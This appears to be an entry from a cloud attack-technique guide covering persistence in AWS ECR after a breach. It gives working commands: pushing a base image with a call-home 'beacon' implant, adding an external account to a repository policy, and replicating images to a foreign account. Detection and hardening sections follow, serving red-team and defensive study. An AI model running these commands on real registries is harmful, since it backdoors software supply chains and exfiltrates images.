---
cstg_id: CSTG-AWS-ECR-PERSIST
title: "AWS Ecr - Persistence"
provider: aws
service: ecr
phase: persistence
required_access: assumed-breach
required_permissions:
  - ecr:PutImage
  - ecr:InitiateLayerUpload
  - ecr:UploadLayerPart
  - ecr:CompleteLayerUpload
  - ecr:GetAuthorizationToken
  - ecr:SetRepositoryPolicy
  - ecr:PutRegistryPolicy
  - ecr:CreateRepository
  - ecr:CreatePullThroughCacheRule
  - ecr:PutReplicationConfiguration
  - ecr:PutLifecyclePolicy
tools: []
references:
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/repository-policies.html"
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/registry-permissions.html"
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/replication.html"
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/pull-through-cache.html"
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/LifecyclePolicies.html"
  - "https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-tag-mutability.html"
license: CC BY-SA 4.0
---

## Summary

Persistence through ECR means establishing durable footholds in or around the registry that survive credential rotation, incident response, and image rebuilds. Because ECR images are continuously pulled and re-run by compute (ECS, EKS, Lambda, App Runner, CodeBuild), a backdoor embedded in the supply chain re-executes on every deploy or scale-out, giving the attacker repeated fresh access without re-using a burned credential.

Persistence techniques fall into three families: (1) **backdoored images** that re-grant access each time they run; (2) **policy/configuration backdoors** that keep external or attacker principals authorized to read or write the registry; and (3) **infrastructure-level mirroring** (replication, pull-through cache) that quietly distributes attacker-controlled content. The objective is stealthy, self-healing access keyed off the registry rather than off any single set of credentials.

## Prerequisites

- **Access level:** an assumed-breach foothold holding the relevant ECR write or policy permissions (commonly via a compromised CI/CD, deployment, or administrative role).
- Knowledge from [ECR enumeration](../02-services/aws-ecr-enum.md) of which repositories feed which workloads, and whether tags are mutable.
- See [ECR Privilege Escalation](../03-privilege-escalation/aws-ecr-privesc.md) for the initial image-tampering mechanics this phase builds on.

## Enumeration

```bash
REGION=us-east-1; ACCT=111122223333
aws ecr describe-repositories --region $REGION
aws ecr describe-registry --region $REGION                 # replication config
aws ecr describe-pull-through-cache-rules --region $REGION
aws ecr get-registry-policy --region $REGION
aws ecr get-lifecycle-policy --repository-name my-app --region $REGION
```

Identify long-lived, frequently pulled "base" images and shared repositories - these are the highest-value persistence anchors because many downstream images and deployments depend on them.

## Misconfigurations & Findings

- **Mutable tags** allowing silent re-poisoning even after a clean image is re-pushed.
- **Resource/registry policies that include external or wildcard principals** - persistent cross-account read/write access independent of any credential.
- **Replication or pull-through cache rules** pointing at attacker-influenced sources or copying images to attacker-accessible accounts/regions.
- **Backdoored base images** that are widely consumed via `FROM`, so the backdoor propagates into many rebuilt images.
- **Lifecycle policies tuned to preserve attacker artifacts** or to expire/clean up evidence images.

## Exploitation

### Backdoored / poisoned images (PutImage + layer upload)

Re-push a backdoored image to a frequently consumed, mutable tag (or a popular base image). Every deploy and autoscale event re-runs it, re-establishing access on a schedule the environment itself drives.

```bash
aws ecr get-login-password --region $REGION \
  | docker login --username AWS --password-stdin $ACCT.dkr.ecr.$REGION.amazonaws.com

cat > Dockerfile <<'EOF'
FROM 111122223333.dkr.ecr.us-east-1.amazonaws.com/base-runtime:latest
# beacon/implant that calls home on container start; keep original entrypoint working
COPY beacon /usr/local/bin/beacon
RUN echo '/usr/local/bin/beacon &' >> /etc/profile.d/00-init.sh
EOF
docker build -t $ACCT.dkr.ecr.$REGION.amazonaws.com/base-runtime:latest .
docker push $ACCT.dkr.ecr.$REGION.amazonaws.com/base-runtime:latest
```

Poisoning a **base image** is especially durable: downstream application images that `FROM` it inherit the backdoor on their next rebuild, so the persistence survives even after the directly compromised app image is replaced.

### Repository policy backdoor (SetRepositoryPolicy)

Keep an attacker-controlled external account authorized to pull and push the repository. This persists across rotation of the original foothold's credentials, since access is granted by the resource policy itself.

```bash
aws ecr set-repository-policy --repository-name base-runtime --region $REGION \
  --policy-text '{"Version":"2008-10-17","Statement":[{"Sid":"persist","Effect":"Allow",
    "Principal":{"AWS":"arn:aws:iam::444455556666:root"},
    "Action":["ecr:BatchGetImage","ecr:GetDownloadUrlForLayer","ecr:PutImage",
              "ecr:InitiateLayerUpload","ecr:UploadLayerPart","ecr:CompleteLayerUpload"]}]}'
```

### Registry policy + replication backdoor

`PutRegistryPolicy` plus `PutReplicationConfiguration` lets an attacker configure cross-account/cross-region replication so images are continuously copied to an account or region the attacker controls - durable exfiltration and a standby copy of the supply chain. Replication also re-creates repositories in destination regions, spreading content.

```bash
aws ecr put-replication-configuration --region $REGION --replication-configuration '{
  "rules":[{"destinations":[{"region":"eu-west-1","registryId":"444455556666"}]}]}'
```

### Pull-through cache backdoor (CreatePullThroughCacheRule)

Create or repoint a pull-through cache rule so a namespace transparently serves images from an upstream the attacker controls. Future pulls of `…/<namespace>/<image>` fetch attacker content without any further push, re-poisoning on demand.

### Hidden / decoy repositories (CreateRepository)

Create innocuously named repositories to stage implant images, store exfiltrated loot as OCI artifacts, or host malicious base images - blending into a large registry and surviving cleanup focused only on known repos.

### Lifecycle policy abuse (PutLifecyclePolicy)

Tune lifecycle rules to retain attacker images indefinitely while expiring older legitimate images, or to auto-remove forensic artifacts, shaping the registry to the attacker's advantage over time.

## Detection & Logging

Recorded in **AWS CloudTrail**:

- `PutImage` / `InitiateLayerUpload` / `CompleteLayerUpload` - repeated or off-hours pushes, especially overwrites of base-image or production tags.
- `SetRepositoryPolicy`, `PutRegistryPolicy` - look for added external accounts or wildcard principals.
- `PutReplicationConfiguration` - new replication destinations, particularly to unfamiliar account ids or regions.
- `CreatePullThroughCacheRule` - new/modified cache upstreams.
- `CreateRepository` - unexpected new repositories (possible staging/decoy).
- `PutLifecyclePolicy` - lifecycle changes that retain or purge specific images.

Detection ideas:

- Alert on any repository/registry policy change introducing an external or wildcard principal.
- Alert on new replication destinations or pull-through cache rules pointing outside approved accounts/registries.
- Alert on tag overwrites of base/production images and on pushes from principals that are not the sanctioned CI/CD identity.
- Use Amazon Inspector (enhanced scanning) and GuardDuty to flag newly introduced malicious images on every push.
- Periodically diff actual repository/registry policies and replication/cache config against an approved baseline (IaC drift detection).

## Remediation & Hardening

- Enforce **immutable tags** so a clean re-push cannot be silently re-poisoned at the same tag.
- Require **image signing and deploy-time signature verification**; reject unsigned or untrusted-signer images so backdoored images cannot run even if pushed.
- Restrict policy-affecting actions (`SetRepositoryPolicy`, `PutRegistryPolicy`, `PutReplicationConfiguration`, `CreatePullThroughCacheRule`, `CreateRepository`, `PutLifecyclePolicy`) to a minimal admin set; use SCPs to forbid replication/cross-account grants to non-approved accounts.
- Manage registry policies, replication, and cache rules exclusively via reviewed IaC, and alert on out-of-band drift.
- Continuously rescan all images (not only at push) and rebuild from trusted, signed base images; pin base images by digest.
- Pin deployments to specific image digests rather than mutable tags so changing the underlying image does not silently change what runs.
- During incident response, audit all repository/registry policies, replication and pull-through cache rules, recently created repositories, and lifecycle policies - not just the obviously compromised image.

## Tools

- AWS CLI/SDKs and Docker/`crane`/`buildkit` for building and pushing backdoored or base images.
- Policy/configuration baseline and drift-detection tooling (IaC scanners) for registry, replication, and cache rules.
- Image and secret scanners (e.g. Trivy, Grype, TruffleHog) plus managed detections (Inspector, GuardDuty).

## References

- AWS - Repository policies: https://docs.aws.amazon.com/AmazonECR/latest/userguide/repository-policies.html
- AWS - Private registry permissions: https://docs.aws.amazon.com/AmazonECR/latest/userguide/registry-permissions.html
- AWS - Private registry replication: https://docs.aws.amazon.com/AmazonECR/latest/userguide/replication.html
- AWS - Pull-through cache: https://docs.aws.amazon.com/AmazonECR/latest/userguide/pull-through-cache.html
- AWS - Lifecycle policies: https://docs.aws.amazon.com/AmazonECR/latest/userguide/LifecyclePolicies.html
- AWS - Image tag mutability: https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-tag-mutability.html
